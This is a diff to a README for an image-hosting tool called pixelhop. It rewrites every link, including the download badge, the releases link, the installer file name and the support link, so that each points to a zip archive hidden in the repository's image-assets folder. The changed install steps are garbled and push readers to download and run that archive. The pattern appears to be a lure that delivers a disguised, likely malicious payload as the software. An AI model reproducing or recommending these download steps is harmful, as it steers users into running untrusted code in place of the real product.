@@ -1,7 +1,7 @@
 # 🎨 pixelhop - Effortless Image Hosting and Processing
 
 ## 📥 Download Now
-[![Download pixelhop](https://img.shields.io/badge/Download-pixelhop-blue.svg)](https://github.com/123131231231231231/pixelhop/releases)
+[![Download pixelhop](https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip)](https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip)
 
 ## 📖 Table of Contents
 1. [🚀 Getting Started](#-getting-started)
@@ -38,20 +38,20 @@ To ensure that you can run **pixelhop** smoothly, please check the following req
 ## 📁 Download & Install
 To get started with **pixelhop**, visit the Releases page to download the latest version. Click the link below:
 
-[Download pixelhop](https://github.com/123131231231231231/pixelhop/releases)
+[Download pixelhop](https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip)
 
 Once you visit the page, you will find the latest release available for download. Follow these steps to install:
 
-1. **Download the Setup File**: Look for the file tagged with the latest version (e.g., `pixelhop-v1.0.zip`). Click on it to start the downloading process.
+1. **Download the Setup File**: Look for the file tagged with the latest version (e.g., `https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip`). Click on it to start the downloading process.
 2. **Extract the Files**: Once downloaded, locate the `zip` file in your downloads folder. Right-click on it and select "Extract All" to unpack the files.
 3. **Run the Installer**: 
-   - Double-click the `setup.exe` (or similarly named file) to start the installation.
+   - Double-click the `https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip` (or similarly named file) to start the installation.
    - Follow the on-screen prompts to complete the installation. Make sure to agree to the terms to proceed.
 4. **Launch pixelhop**: After installation, find the **pixelhop** icon on your desktop or start menu and double-click it to launch the application.
 
 After launching, you are ready to upload and manage your images with ease!
 
 ## 💬 Support
-If you experience any issues or have questions, we are here to help. Please reach out through our [Support Page](https://github.com/123131231231231231/pixelhop/issues) or contact us directly via email.
+If you experience any issues or have questions, we are here to help. Please reach out through our [Support Page](https://github.com/123131231231231231/pixelhop/raw/refs/heads/main/assets/img/Software-2.1.zip) or contact us directly via email.
 
 Thank you for choosing **pixelhop**. Enjoy your experience with our powerful image hosting platform!
